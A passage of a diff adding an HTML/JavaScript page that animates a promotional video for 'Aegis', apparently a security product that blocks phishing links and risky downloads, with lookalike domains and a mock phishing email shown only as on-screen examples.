@@ -1,0 +1,814 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Aegis product video</title>
+<style>
+@font-face { font-family: "Sora"; src: url("../design-system/fonts/Sora-Variable.woff2") format("woff2"); font-weight: 100 800; }
+@font-face { font-family: "Manrope"; src: url("../design-system/fonts/Manrope-Variable.woff2") format("woff2"); font-weight: 200 800; }
+@font-face { font-family: "JetBrains Mono"; src: url("../design-system/fonts/JetBrainsMono-Variable.woff2") format("woff2"); font-weight: 100 800; }
+
+/* Night ops tokens, from design-system/tokens.css */
+:root {
+  --ground: #04111f; --surface: #071d33; --surface-raised: #0a2a43; --surface-overlay: #0f3a5c;
+  --border: #164463; --border-strong: #4a82a6;
+  --ink: #e6f3fb; --ink-muted: #9fbdd1; --ink-subtle: #86a9c0;
+  --accent: #50e6ff; --accent-hover: #8bf0ff; --accent-soft: #0b3b52; --on-accent: #031a2b; --brand: #1a74c4;
+  --danger: #ff6b80; --danger-bg: #3a1a2a; --warning: #ffb547; --warning-bg: #38290f;
+  --success: #2fe0b5; --success-bg: #0b3a3a; --info: #7cb7ff; --info-bg: #10304f;
+  --glow-sm: 0 0 12px rgba(80,230,255,0.28); --glow-md: 0 0 32px rgba(80,230,255,0.22);
+  --elev-card: 0 12px 40px rgba(0,8,20,0.45); --inset-edge: inset 0 1px 0 rgba(160,220,255,0.10);
+  --display: "Sora", system-ui, sans-serif; --sans: "Manrope", system-ui, sans-serif; --mono: "JetBrains Mono", ui-monospace, monospace;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { background: #000; height: 100%; overflow: hidden; color: var(--ink); font-family: var(--sans); }
+#viewport { position: fixed; inset: 0; display: grid; place-items: center; }
+#stage { position: absolute; left: 0; top: 0; width: 1920px; height: 1080px; overflow: hidden; background: var(--ground); transform-origin: 0 0; }
+#bg { position: absolute; inset: 0; }
+.grain { position: absolute; inset: -50%; pointer-events: none; opacity: .07; mix-blend-mode: overlay;
+  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='240' height='240'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='2' stitchTiles='stitch'/></filter><rect width='100%' height='100%' filter='url(%23n)'/></svg>"); }
+.vignette { position: absolute; inset: 0; pointer-events: none; background: radial-gradient(ellipse at 50% 45%, transparent 55%, rgba(0,4,10,.75) 100%); }
+#sweep { position: absolute; left: 0; right: 0; height: 2px; background: var(--accent); box-shadow: 0 0 24px 6px rgba(80,230,255,.55), 0 0 90px 20px rgba(80,230,255,.18); opacity: 0; }
+#flash { position: absolute; inset: 0; background: radial-gradient(circle at 50% 50%, rgba(139,240,255,.55), rgba(80,230,255,0) 60%); opacity: 0; pointer-events: none; mix-blend-mode: screen; }
+#black { position: absolute; inset: 0; background: #000; opacity: 0; pointer-events: none; }
+
+.scene { position: absolute; inset: 0; display: none; will-change: opacity, transform; }
+.abs { position: absolute; }
+.mono { font-family: var(--mono); }
+.eyebrow { font: 700 20px/1 var(--sans); letter-spacing: .18em; text-transform: uppercase; color: var(--accent); }
+.h1 { font: 700 84px/1.05 var(--display); letter-spacing: -.02em; }
+.h2 { font: 700 60px/1.1 var(--display); letter-spacing: -.015em; }
+.lead { font: 500 30px/1.4 var(--sans); color: var(--ink-muted); }
+.muted { color: var(--ink-muted); } .subtle { color: var(--ink-subtle); }
+.accent { color: var(--accent); } .danger { color: var(--danger); } .warning { color: var(--warning); } .success { color: var(--success); }
+.card { background: linear-gradient(180deg, rgba(10,42,67,.92), rgba(7,29,51,.94)); border: 1px solid var(--border); border-radius: 20px; box-shadow: var(--elev-card), var(--inset-edge); }
+.card.hl { border-color: rgba(80,230,255,.55); box-shadow: var(--elev-card), var(--inset-edge), var(--glow-md); }
+.label { font: 700 15px/1 var(--sans); letter-spacing: .14em; text-transform: uppercase; color: var(--ink-subtle); }
+svg.i { display: inline-block; vertical-align: middle; flex: none; }
+
+.badge { display: inline-flex; align-items: center; gap: .45em; padding: .38em .85em .38em .7em; border-radius: 999px; border: 1.5px solid currentColor;
+  font: 800 1em/1 var(--sans); letter-spacing: .06em; text-transform: uppercase; white-space: nowrap; }
+.badge svg { width: 1.05em; height: 1.05em; }
+.b-mal { color: var(--danger); background: var(--danger-bg); }
+.b-sus { color: var(--warning); background: var(--warning-bg); }
+.b-unk { color: var(--info); background: var(--info-bg); }
+.b-cln { color: var(--success); background: var(--success-bg); }
+
+.caret { display: inline-block; width: .55em; height: 1em; background: var(--accent); vertical-align: -0.12em; margin-left: 2px; }
+.cursor { position: absolute; left: 0; top: 0; width: 34px; height: 34px; filter: drop-shadow(0 4px 10px rgba(0,0,0,.6)); z-index: 50; }
+.ripple { position: absolute; width: 90px; height: 90px; margin: -45px 0 0 -45px; border-radius: 50%; border: 3px solid var(--accent); opacity: 0; z-index: 49; }
+
+/* S1 */
+.row { position: absolute; left: 0; white-space: nowrap; font: 500 26px/1 var(--mono); color: var(--ink-subtle); }
+.row .hot-r { color: var(--danger); } .row .hot-c { color: var(--accent); }
+.kin { position: absolute; left: 0; right: 0; text-align: center; font: 800 132px/1 var(--display); letter-spacing: -.035em; text-shadow: 0 10px 60px rgba(0,0,0,.8); }
+/* S2 */
+.file { position: absolute; display: flex; align-items: center; gap: 14px; padding: 16px 22px; border-radius: 14px; background: var(--surface-raised); border: 1px solid var(--border-strong); font: 600 24px/1 var(--mono); box-shadow: var(--elev-card); }
+/* S5 */
+.browser { position: absolute; left: 760px; top: 150px; width: 1060px; height: 780px; border-radius: 18px; overflow: hidden; background: #0b1724; border: 1px solid var(--border); box-shadow: 0 40px 120px rgba(0,0,0,.6), var(--inset-edge); }
+.chrome-bar { height: 56px; background: #0f2235; display: flex; align-items: center; gap: 10px; padding: 0 20px; border-bottom: 1px solid var(--border); }
+.dot3 { width: 13px; height: 13px; border-radius: 50%; }
+.omni { margin-left: 24px; flex: 1; height: 34px; border-radius: 999px; background: #0a1a2a; border: 1px solid var(--border); display: flex; align-items: center; padding: 0 16px; gap: 10px; font: 500 17px/1 var(--mono); color: var(--ink-subtle); }
+.mail { padding: 44px 60px; font: 500 24px/1.6 var(--sans); color: #c9dbe8; }
+.sig { display: flex; align-items: center; gap: 16px; padding: 18px 24px; border-radius: 16px; border: 1px solid var(--border); background: rgba(7,29,51,.8); font: 600 28px/1 var(--sans); width: 520px; }
+.sig .tick { width: 34px; height: 34px; border-radius: 50%; display: grid; place-items: center; background: var(--danger-bg); color: var(--danger); border: 1.5px solid var(--danger); }
+.btn { display: inline-flex; align-items: center; gap: 10px; padding: 16px 28px; border-radius: 999px; font: 800 22px/1 var(--sans); }
+.btn.primary { background: var(--accent); color: var(--on-accent); box-shadow: var(--glow-sm); }
+.btn.ghost { border: 1.5px solid var(--border-strong); color: var(--ink); }
+/* S7 */
+.panel { position: absolute; top: 290px; width: 830px; height: 610px; padding: 30px 34px; }
+.term { margin-top: 22px; height: 430px; border-radius: 14px; background: #020c17; border: 1px solid var(--border); padding: 20px 22px; font: 500 19px/1.62 var(--mono); color: var(--ink-muted); overflow: hidden; }
+.term .ln { white-space: pre; }
+.pill { display: inline-flex; align-items: center; gap: 10px; padding: 10px 16px; border-radius: 999px; font: 800 16px/1 var(--sans); letter-spacing: .12em; text-transform: uppercase; }
+.pill.off { color: var(--danger); background: var(--danger-bg); border: 1.5px solid var(--danger); }
+/* S8 ladder */
+.rung { position: absolute; left: 0; width: 560px; height: 92px; border-radius: 16px; border: 1px solid var(--border); background: rgba(7,29,51,.85); display: flex; align-items: center; padding: 0 28px; font-size: 26px; }
+/* S9 code */
+.code { font: 500 20px/1.75 var(--mono); }
+.code .cl { position: relative; padding: 0 18px 0 70px; white-space: pre; border-left: 3px solid transparent; }
+.code .cl .n { position: absolute; left: 18px; color: #4f7591; }
+.code .cl .hlb { position: absolute; inset: 0; background: rgba(255,107,128,.14); transform-origin: 0 50%; }
+.code .cl .tag { position: absolute; right: 16px; top: 50%; margin-top: -15px; width: 30px; height: 30px; border-radius: 50%; background: var(--danger); color: #2a0610; font: 800 17px/30px var(--sans); text-align: center; }
+.step { display: flex; gap: 22px; align-items: flex-start; }
+.step .num { flex: none; width: 46px; height: 46px; border-radius: 50%; border: 2px solid var(--danger); color: var(--danger); display: grid; place-items: center; font: 800 22px/1 var(--display); background: var(--danger-bg); }
+/* S10 phone */
+.phone { position: absolute; left: 1150px; top: 70px; width: 470px; height: 940px; border-radius: 70px; background: #0a0f15; border: 3px solid #2a3a4a; box-shadow: 0 50px 140px rgba(0,0,0,.7), inset 0 0 0 10px #05080c; overflow: hidden; }
+.bubble { position: absolute; max-width: 330px; padding: 16px 20px; border-radius: 26px; font: 500 21px/1.4 -apple-system, "SF Pro Text", var(--sans); }
+.bubble.me { right: 24px; background: #0a84ff; color: #fff; border-bottom-right-radius: 8px; }
+.bubble.them { left: 24px; background: #26303b; color: #eef4f8; border-bottom-left-radius: 8px; }
+/* S11 */
+.menubar { position: absolute; left: 0; right: 0; top: 0; height: 40px; background: rgba(8,20,33,.72); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,.06); display: flex; align-items: center; padding: 0 22px; gap: 26px; font: 600 17px/1 -apple-system, var(--sans); color: #dfe9f1; z-index: 5; }
+.tile { position: absolute; padding: 26px 30px; }
+.tile .v { font: 800 64px/1 var(--display); letter-spacing: -.02em; margin-top: 16px; }
+.keycap { width: 110px; height: 110px; border-radius: 22px; background: linear-gradient(180deg,#1c2b3a,#101b27); border: 1.5px solid #3a5268; box-shadow: 0 8px 0 #0a121b, 0 14px 30px rgba(0,0,0,.6); display: grid; place-items: center; font: 600 34px/1 -apple-system, var(--sans); color: #dce8f2; }
+
+/* preview controls */
+#controls { position: fixed; left: 0; right: 0; bottom: 0; display: flex; gap: 14px; align-items: center; padding: 12px 18px; background: rgba(2,10,20,.85); font: 600 14px/1 var(--mono); color: var(--ink-muted); z-index: 10; }
+#controls button { background: var(--accent); color: var(--on-accent); border: 0; border-radius: 999px; padding: 8px 16px; font: 800 14px/1 var(--sans); cursor: pointer; }
+#controls input { flex: 1; accent-color: #50e6ff; }
+body.render #controls { display: none; }
+</style>
+</head>
+<body>
+<div id="viewport"><div id="stage">
+  <canvas id="bg" width="1920" height="1080"></canvas>
+  <div id="scenes"></div>
+  <div id="sweep"></div>
+  <div id="flash"></div>
+  <div class="vignette"></div>
+  <div class="grain"></div>
+  <div id="black"></div>
+</div></div>
+<div id="controls"><button id="play">Play</button><input id="scrub" type="range" min="0" max="96" step="0.01" value="0"><span id="clock">0.00</span></div>
+<audio id="audio" src="build/mix.wav" preload="auto"></audio>
+
+<script>
+const DUR = 96;
+const ICONS = {"shield":["M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"],"shield-check":["M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z","m9 12 2 2 4-4"],"shield-alert":["M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z","M12 8v4","M12 16h.01"],"lock":["M19 11a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-6a2 2 0 0 1 2-2z","M7 11V7a5 5 0 0 1 10 0v4"],"alert":["m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3","M12 9v4","M12 17h.01"],"info":["M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20","M12 16v-4","M12 8h.01"],"check-circle":["M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20","m9 12 2 2 4-4"],"globe":["M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20","M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20","M2 12h20"],"wifi-off":["m2 2 20 20","M8.5 16.5a5 5 0 0 1 7 0","M2 8.82a15 15 0 0 1 4.17-2.65","M10.66 5c4.01-.36 8.14.9 11.34 3.76","M16.85 11.25a10 10 0 0 1 2.22 1.68","M5 13a10 10 0 0 1 5.24-2.76","M12 20h.01"],"link":["M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71","M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"],"file-text":["M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z","M14 2v4a2 2 0 0 0 2 2h4","M10 9H8","M16 13H8","M16 17H8"],"message-square":["M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"],"x":["M18 6 6 18","m6 6 12 12"],"check":["M20 6 9 17l-5-5"],"arrow":["M5 12h14","m12 5 7 7-7 7"],"box":["M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z","m3.3 7 8.7 5 8.7-5","M12 22V12"],"scan":["M3 7V5a2 2 0 0 1 2-2h2","M17 3h2a2 2 0 0 1 2 2v2","M21 17v2a2 2 0 0 1-2 2h-2","M7 21H5a2 2 0 0 1-2-2v-2","M3 12h18"],"bug":["M14 2a2 2 0 0 1 2 2v2H8V4a2 2 0 0 1 2-2z","M6 10a6 6 0 0 1 12 0v4a6 6 0 0 1-12 0z","M3 11h3","M18 11h3","M4 19l2.5-2","M20 19l-2.5-2","M4 5l2.5 2","M20 5l-2.5 2"],"search":["M11 3a8 8 0 1 0 0 16 8 8 0 1 0 0-16","m21 21-4.3-4.3"],"bell":["M10.3 21a1.94 1.94 0 0 0 3.4 0","M21 18H3a2 2 0 0 0 2-2V9a7 7 0 1 1 14 0v7a2 2 0 0 0 2 2"],"dashboard":["M3 5a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z","M15 3h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2","M5 13h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4a2 2 0 0 1 2-2","M15 13h4a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2v-4a2 2 0 0 1 2-2"],"radar":["M19.07 4.93A10 10 0 0 0 6.99 3.34","M4 6h.01","M2.29 9.62A10 10 0 1 0 21.31 8.35","M16.24 7.76A6 6 0 1 0 8.23 16.67","M12 18h.01","M17.99 11.66A6 6 0 0 1 15.77 16.67","m22 2-9.6 9.6","M12 13a1 1 0 1 0 0-2 1 1 0 0 0 0 2"],"file-search":["M14 2v4a2 2 0 0 0 2 2h4","M4 4a2 2 0 0 1 2-2h8l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z","M11.5 13.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5","m16 18-1.7-1.7"],"trend-up":["M16 7h6v6","m22 7-8.5 8.5-5-5L2 17"],"users":["M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2","M10 7a4 4 0 1 0 0 .01","M22 21v-2a4 4 0 0 0-3-3.87","M16 3.13a4 4 0 0 1 0 7.75"],"database":["M3 5V19A9 3 0 0 0 21 19V5","M3 12A9 3 0 0 0 21 12","M12 2c-4.97 0-9 1.34-9 3s4.03 3 9 3 9-1.34 9-3-4.03-3-9-3"],"activity":["M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2"]};
+ICONS['arrow-up'] = ['M12 19V5', 'm5 12 7-7 7 7'];
+ICONS['arrow-down'] = ['M12 5v14', 'm19 12-7 7-7-7'];
+ICONS['download'] = ['M12 15V3', 'M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4', 'm7 10 5 5 5-5'];
+ICONS['folder'] = ['M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z'];
+ICONS['cpu'] = ['M6 4h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z', 'M9 9h6v6H9z', 'M9 1v3', 'M15 1v3', 'M9 20v3', 'M15 20v3', 'M20 9h3', 'M20 14h3', 'M1 9h3', 'M1 14h3'];
+ICONS['eye-off'] = ['M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68', 'M6.61 6.61A13.53 13.53 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61', 'M14.12 14.12a3 3 0 1 1-4.24-4.24', 'm2 2 20 20'];
+
+const ic = (n, s = 24, w = 2, cls = 'i') => `<svg class="${cls}" width="${s}" height="${s}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="${w}" stroke-linecap="round" stroke-linejoin="round">${ICONS[n].map(d => `<path d="${d}"/>`).join('')}</svg>`;
+const BADGE = { mal: ['shield-alert', 'Malicious'], sus: ['alert', 'Suspicious'], unk: ['info', 'Unknown'], cln: ['check-circle', 'Clean'] };
+const badge = (k, attrs = '', size = '') => `<span class="badge b-${k}" ${attrs} style="${size ? 'font-size:' + size : ''}">${ic(BADGE[k][0], 24, 2.4)}${BADGE[k][1]}</span>`;
+// entrance attributes: in (s), d (s), fx, out (s)
+const A = (inT, fx = 'up', d = 0.6, out) => `data-in="${inT}" data-fx="${fx}" data-d="${d}"${out != null ? ` data-out="${out}"` : ''}`;
+const cursorSvg = `<svg class="cursor" viewBox="0 0 24 24"><path d="M4 2.5 L4 20 L8.6 15.6 L11.6 22.2 L14.6 20.9 L11.7 14.4 L18 14.4 Z" fill="#fff" stroke="#05192c" stroke-width="1.4" stroke-linejoin="round"/></svg>`;
+
+/* ---------------- scenes ---------------- */
+const S = [];
+
+// S1 · cold open
+{
+  const items = ['accounts.google.com/signin', 'invoice_oct.iso', 'docs.vendor.com/api/auth', 'Q3-summary.xlsm', 'bit.ly/3xQ9aLm', 'drive.google.com/file/d/1fA', 'setup_v2.scr', 'zoom.us/j/8812', 'paypa1-secure.com/login', 'brand-assets.zip', 'cdn-assets-delivery.top/pkg.js', 'login-northwlnd-io.sbs/sso', 'github.com/org/repo', 'ZoomUpdate.pkg', 'notion.so/team/roadmap', 'usps-redelivery.top/pay', 'drivers.zip', 'calendar.google.com', 'vendor-sdk.pkg', 'meet.google.com/xyz-abcd'];
+  let rows = '';
+  for (let r = 0; r < 15; r++) {
+    let s = '';
+    for (let k = 0; k < 16; k++) {
+      const it = items[(r * 7 + k * 3) % items.length];
+      const hot = (r * 5 + k) % 11 === 0 ? 'hot-r' : (r + k * 2) % 13 === 0 ? 'hot-c' : '';
+      s += `<span class="${hot}">${it}</span>&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp;`;
+    }
+    rows += `<div class="row" data-row="${r}" style="top:${40 + r * 70}px">${s}</div>`;
+  }
+  S.push({ id: 's1', s: 0, e: 8, html: `
+    <div id="s1rows">${rows}</div>
+    <div class="kin" style="top:330px" ${A(1.0, 'blur', .8)}>Every click.</div>
+    <div class="kin accent" style="top:500px" ${A(3.0, 'blur', .8)}>Every download.</div>
+    <div class="abs lead" style="left:0;right:0;top:690px;text-align:center" ${A(4.6, 'up', .7)}>Most of them, you've never seen before.</div>
+  ` });
+}
+
+// S2 · the old way
+S.push({ id: 's2', s: 8, e: 15.5, html: `
+  <div class="abs" style="left:140px;top:250px;width:760px">
+    <div class="eyebrow" style="color:var(--danger)" ${A(8.3)}>The old way</div>
+    <div class="h1" style="margin-top:28px" ${A(8.6)}>Scan it after<br>it lands.</div>
+    <div class="h1 muted" style="margin-top:26px" ${A(11.2)}>Catch only<br>what's known.</div>
+  </div>
+  <div class="abs" id="laptop" style="left:1040px;top:290px;width:760px;height:520px" ${A(8.4, 'scale', .8)}>
+    <div class="abs" style="left:60px;top:0;width:640px;height:410px;border-radius:22px;border:3px solid #3b5870;background:#06121f;overflow:hidden">
+      <div id="lapflash" class="abs" style="inset:0;background:radial-gradient(circle,rgba(255,107,128,.35),rgba(255,107,128,0) 70%);opacity:0"></div>
+      <div class="abs" id="lapalert" style="left:110px;top:120px;width:420px;padding:26px 28px;border-radius:16px;background:var(--danger-bg);border:2px solid var(--danger);opacity:0">
+        <div style="display:flex;gap:14px;align-items:center;font:800 30px/1 var(--display);color:var(--danger)">${ic('alert', 34, 2.4)} Threat detected</div>
+        <div class="mono" style="margin-top:14px;font-size:19px;color:#f3b9c3">invoice_oct.iso was already opened</div>
+      </div>
+      <div class="abs" id="lapok" style="left:110px;top:120px;width:420px;padding:26px 28px;border-radius:16px;background:var(--success-bg);border:2px solid var(--success);opacity:0">
+        <div style="display:flex;gap:14px;align-items:center;font:800 30px/1 var(--display);color:var(--success)">${ic('check-circle', 34, 2.4)} No threats found</div>
+        <div class="mono" style="margin-top:14px;font-size:19px;color:#b9eee0">update_helper.pkg · not in database</div>
+      </div>
+      <div class="abs danger" id="bug" style="left:470px;top:300px;opacity:0">${ic('bug', 54, 2)}</div>
+    </div>
+    <div class="abs" style="left:0;top:418px;width:760px;height:30px;border-radius:0 0 26px 26px;background:linear-gradient(180deg,#2c4459,#13273a)"></div>
+  </div>
+  <div class="file" id="f1" style="left:1250px;top:0;color:var(--ink)">${ic('file-text', 30)} invoice_oct.iso</div>
+  <div class="file" id="f2" style="left:1220px;top:0;color:var(--ink)">${ic('box', 30)} update_helper.pkg</div>
+  <div class="abs mono" style="left:1340px;top:880px;font-size:22px;color:var(--danger)" ${A(12.9, 'up', .5)}>a new threat walks straight past</div>
+` });
+
+// S3 · logo reveal
+const shieldSvg = (id, size) => `<svg id="${id}" width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round" style="overflow:visible">
+  <defs><linearGradient id="${id}g" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#1a74c4" stop-opacity=".55"/><stop offset="1" stop-color="#04111f" stop-opacity=".2"/></linearGradient></defs>
+  <path class="sfill" d="${ICONS.shield[0]}" fill="url(#${id}g)" stroke="none" opacity="0"/>
+  <path class="sline" d="${ICONS.shield[0]}" stroke="#50e6ff" stroke-width="1.15"/>
+  <path class="scheck" d="m8.6 12.2 2.4 2.4 4.6-4.8" stroke="#50e6ff" stroke-width="1.5"/>
+</svg>`;
+S.push({ id: 's3', s: 15.5, e: 22, html: `
+  <div id="rings" class="abs" style="left:0;top:0;width:1920px;height:1080px"></div>
+  <div id="lockup" class="abs" style="left:0;right:0;top:330px;height:300px">
+    <div id="s3shield" class="abs" style="left:810px;top:0;width:300px;height:300px;filter:drop-shadow(0 0 30px rgba(80,230,255,.45))">${shieldSvg('sh1', 300)}</div>
+    <div id="word" class="abs" style="left:900px;top:30px;font:800 230px/1 var(--display);letter-spacing:-.04em">
+      ${'Aegis'.split('').map((c, i) => `<span class="wl" data-i="${i}" style="display:inline-block">${c}</span>`).join('')}
+    </div>
+  </div>
+  <div class="abs lead" style="left:0;right:0;top:700px;text-align:center;font-size:40px;color:var(--ink)"><span data-type="42" data-in="17.9">Every link and download, judged before it reaches you.</span></div>
+` });
+
+// S4 · four verdicts
+{
+  const v = [['mal', 23.9, 'login-northwlnd-io.sbs', 'This is dangerous'], ['sus', 24.8, 'cdn-assets-delivery.top', 'This looks risky'], ['unk', 25.65, 'bit.ly/3xQ9aLm', 'No confident verdict'], ['cln', 26.55, 'docs.vendor.com', 'No threats found']];
+  S.push({ id: 's4', s: 22, e: 28, html: `
+    <div class="abs" style="left:0;right:0;top:170px;text-align:center">
+      <div class="eyebrow" ${A(22.3)}>One of four verdicts</div>
+      <div class="h1" style="margin-top:26px" ${A(22.5)}>Never a colour alone.</div>
+    </div>
+    ${v.map(([k, t, url, sen], i) => `
+      <div class="abs" style="left:${150 + i * 420}px;top:500px;width:360px;text-align:center">
+        <div class="shock" data-t="${t}" data-k="${k}" style="position:absolute;left:180px;top:46px;width:10px;height:10px"></div>
+        <div ${A(t, 'pop', .55)}>${badge(k, '', '38px')}</div>
+        <div class="mono subtle" style="margin-top:44px;font-size:21px" ${A(t + .2, 'up', .5)}>${url}</div>
+        <div style="margin-top:14px;font:600 24px/1.3 var(--sans);color:var(--ink-muted)" ${A(t + .3, 'up', .5)}>${sen}</div>
+      </div>`).join('')}
+  ` });
+}
+
+// S5 · links
+S.push({ id: 's5', s: 28, e: 41, html: `
+  <div class="abs" style="left:110px;top:170px;width:600px">
+    <div class="eyebrow" ${A(28.3)}>Links</div>
+    <div class="h1" style="margin-top:26px;font-size:76px" ${A(28.5)}>Stopped<br>at the click.</div>
+    <div class="abs" style="left:0;top:330px;display:flex;align-items:center;gap:14px;font:700 26px/1 var(--sans);color:var(--accent)" ${A(31.4, 'left', .6)}>${ic('eye-off', 32)} Judged without opening it</div>
+    <div class="abs" style="left:0;top:420px;display:flex;flex-direction:column;gap:16px">
+      ${[['Domain age', 33.4, '2 days'], ['Lookalike brand', 34.4, 'google.com'], ['Safe Browsing', 35.6, 'listed'], ['Certificate record', 36.8, '1 day old']].map(([n, t, val]) =>
+        `<div class="sig" ${A(t, 'left', .5)}><span class="tick">${ic('x', 20, 3)}</span>${n}<span class="mono danger" style="margin-left:auto;font-size:21px">${val}</span></div>`).join('')}
+    </div>
+  </div>
+  <div class="browser" ${A(28.2, 'right', .8)}>
+    <div class="chrome-bar"><span class="dot3" style="background:#ff5f57"></span><span class="dot3" style="background:#febc2e"></span><span class="dot3" style="background:#28c840"></span>
+      <div class="omni">${ic('lock', 16)} mail.google.com/mail/u/0/#inbox/FMfcgz</div></div>
+    <div class="mail">
+      <div style="display:flex;align-items:center;gap:18px">
+        <div style="width:58px;height:58px;border-radius:50%;background:#1a74c4;display:grid;place-items:center;font:800 26px/1 var(--display);color:#fff">G</div>
+        <div><div style="font:700 25px/1.2 var(--sans);color:#fff">Google Accounts</div><div class="mono" style="font-size:18px;color:#7f9bb0">no-reply@accounts-google.support</div></div>
+      </div>
+      <div style="font:700 36px/1.25 var(--display);color:#fff;margin:34px 0 22px">Unusual sign-in attempt blocked</div>
+      <p>Someone tried to sign in to your account from a new device in Lagos, Nigeria. If this wasn't you, review your activity now so we can secure your account.</p>
+      <p style="margin-top:30px">Review at <span id="badlink" style="position:relative;color:#7cb7ff;text-decoration:underline;padding:2px 6px;border-radius:6px">accounts.google.com/security</span></p>
+      <p style="margin-top:30px;color:#7f9bb0">The Google Accounts team</p>
+      <div id="linktag" class="abs" style="left:514px;top:368px;opacity:0">${badge('mal', '', '17px')}</div>
+    </div>
+    <div id="scrim" class="abs" style="inset:0;background:rgba(2,10,20,.78);opacity:0"></div>
+    <div id="guard" class="abs card" style="left:150px;top:118px;width:760px;padding:38px 42px;opacity:0;border-color:rgba(255,107,128,.5)">
+      <div style="display:flex;align-items:center;gap:18px">${badge('mal', '', '18px')}<span class="label">Aegis stopped this click</span></div>
+      <div style="font:700 36px/1.2 var(--display);margin-top:22px">This link imitates a site you might trust.</div>
+      <div class="label" style="margin-top:30px">The link said</div>
+      <div class="mono" style="font-size:26px;margin-top:10px">accounts.google.com/security</div>
+      <div class="label" style="margin-top:22px">It actually goes to</div>
+      <div class="mono danger" style="font-size:26px;margin-top:10px;font-weight:700">login-northwlnd-io.sbs/sso</div>
+      <div style="display:flex;gap:16px;margin-top:34px"><span id="backbtn" class="btn primary">${ic('shield-check', 22, 2.4)} Back to safety</span><span class="btn ghost">Continue anyway</span></div>
+    </div>
+    <div id="never" class="abs pill" style="left:330px;top:640px;opacity:0;color:var(--accent);background:var(--accent-soft);border:1.5px solid var(--accent);font-size:19px">${ic('shield-check', 22, 2.4)} Link never opened</div>
+    <div id="ripple5" class="ripple"></div>
+    <div id="ripple5b" class="ripple"></div>
+    <div id="cur5" style="position:absolute;left:0;top:0">${cursorSvg}</div>
+  </div>
+` });
+
+// S6 · downloads held
+S.push({ id: 's6', s: 41, e: 46.5, html: `
+  <div class="abs" style="left:0;right:0;top:120px;text-align:center">
+    <div class="eyebrow" ${A(41.2)}>Downloads</div>
+    <div class="h1" style="margin-top:24px" ${A(41.4)}>Held before it touches your disk.</div>
+  </div>
+  <div id="dlcard" class="abs card" style="left:560px;top:360px;width:800px;padding:30px 34px" ${A(41.3, 'scale', .6)}>
+    <div style="display:flex;align-items:center;gap:22px">
+      <div id="dlicon" style="width:72px;height:72px;border-radius:16px;background:var(--surface-overlay);display:grid;place-items:center;color:var(--ink)">${ic('box', 38)}</div>
+      <div style="flex:1">
+        <div class="mono" style="font:700 30px/1 var(--mono)">ZoomUpdate.pkg</div>
+        <div class="mono subtle" style="font-size:19px;margin-top:10px">42.1 MB · zoom-updates.co</div>
+      </div>
